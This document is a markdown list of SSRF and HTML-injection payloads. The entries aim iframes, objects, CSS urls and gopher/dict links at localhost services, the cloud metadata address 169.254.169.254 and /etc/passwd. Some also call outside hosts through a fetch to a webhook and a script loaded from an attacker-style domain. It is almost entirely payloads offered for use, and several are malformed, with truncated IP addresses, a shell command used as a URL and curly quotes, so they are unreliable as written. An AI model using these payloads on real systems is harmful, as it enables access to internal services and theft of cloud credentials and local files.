### simple payload
```
<iframe src="http://localhost:5000/admin"></iframe>
"><iframe src="http://169.254.169.254/latest/meta-data" height=2500 width=500>
'"> <img src=x onerror=fetch("https://my.webhook.server")</img>
"><iframe src="cat /etc/passwd" height=2500 width=500>
<object data="http://localhost:5000/admin" width="100%" height="500"></object>
<embed src="file:///etc/passwd">
<script src=”//my.tld/SSRF_exploit.js”></script>
```

### Send others all tag for testing ssrf
```
<!-- HTML Tag Based SSRF Payloads -->
<link rel="stylesheet" href="http://127.0.0">
<base href="http://169.254.169">
<audio src="http://127.0.0.1:22"></audio>
<video src="http://127.0.0.1:3306"></video>
<source src="http://localhost:6379">
<track src="http://127.0.0.1:8080">
<form action="http://localhost/admin" method="POST" id="x"></form><script>document.getElementById('x').submit();</script>
<meta http-equiv="refresh" content="0; url=http://127.0.0">

<!-- CSS Based SSRF Payloads -->
<div style="background-image: url('http://127.0.0.1:25')"></div>
<style>@import 'http://169.254.169';</style>
<li style="list-style-image: url('http://localhost:11211')"></li>
<div style="content: url('http://127.0.0.1:8000')"></div>

<!-- Protocol Bypasses & Local File Read -->
<iframe src="file:///etc/passwd"></iframe>
<img src="gopher://127.0.0.1:6379/_info">
<object data="dict://127.0.0.1:11211/stat"></object>
<embed src="http://2130706433"> <!-- Decimal for 127.0.0.1 -->
<script src="http://[::1]:80"></script> <!-- IPv6 for Localhost -->

<!-- XML/SVG Based (If image uploads are processed) -->
<svg xmlns="http://w3.org"><image href="http://127.0.0.1"/></svg>


<link rel="stylesheet" href="http://127.0.0">
<link rel="icon" href="http://169.254.169.254/latest/meta-data/">
<svg xmlns="http://w3.org"><image href="http://127.0.0"/></svg>
```
